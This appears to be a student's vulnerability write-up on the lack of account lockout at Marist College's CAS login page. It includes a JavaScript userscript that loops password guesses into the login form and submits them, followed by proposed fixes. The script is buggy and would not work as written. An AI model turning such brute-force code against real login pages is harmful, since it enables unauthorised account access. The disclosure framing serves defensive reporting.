# Marist Login Script

## Daniel Gisolfi

#### Disclamer

I have no intention of exploiting this script in any way to login to another user`s account. I will only be using this on my own marist account to test the possibility of someone using this method to steal user information and logins.

### Issue Description

When loging onto marist services, the user is presented with a log on page working at the help desk I noticed a way to exploit the lack of an account lock in order to force log into any account. The current setup for a marist account login is not secure, a key reason for this the limted set of possible passwords a user can have. A marist account must be 6-8 characters long and contain only lower case letters with no special characters. All together this reduces the possible passwords to be comprised of only 36 characters (lowercase letters and numbers 0-9). As a result I have been able to write a script to brute force its way into an account due to the lack of a account lock when more than a few login attempts fail.

**LoginScript.js**

```javascript
// ==UserScript==
if (window.location == 'https://login.marist.edu/cas/login') {
    if(!document.getElementById('password').value){
        alert("Starting");
        var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
        // permutations = permut(charset);
        for (var permutation of permutations){
            //Place password attempt in password textbox
            username = "stdg1";
            document.getElementById('username').value = username;
            document.getElementById('password').value = permutations;
            //Press the submit button
             document.getElementsByName('submit')[0].click();
        }
    }
}

//Heaps Algorithm
function permut(string) {
    if (string.length < 2) return string; //break condition
    var permutations = []; //array to hold permutations
    for (var i=0; i<string.length; i++) {
        var char = string[i];
        // Eliminate duplicates:
        if (string.indexOf(char) != i) // if char was used already
            continue;           // skip it this time
        var remainingString = string.slice(0,i) + string.slice(i+1,string.length);
        for (var subPermutation of permut(remainingString))
            permutations.push(char + subPermutation);
    }
    return permutations;
}
```



### Possible Solutions

1. Add a security measure to lock an account and require a password reset after x amount of login attempts
2. Increase the possible password character options to make a brute force method of cracking passwords far more difficult
3. Add a layer of detection to detect when a script is attempting to force its way into an account